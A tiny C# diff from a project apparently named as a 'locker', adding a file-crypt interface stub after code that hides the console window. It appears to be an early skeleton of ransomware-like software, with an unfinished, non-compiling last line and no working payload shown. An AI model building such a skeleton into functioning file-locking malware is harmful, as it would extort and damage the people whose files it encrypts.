@@ -1,5 +1,6 @@
 ﻿using System;
 using FR46_LCKR.CLASS;
+using FR46_LCKR.Interface;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 
@@ -33,6 +34,8 @@ namespace FR46_LCKR
             //Hide shell
             S_window(hand, sw_hde);
             //Stopped here
+
+            IFil_Crypt: fil_Cr
         }
     }
 }
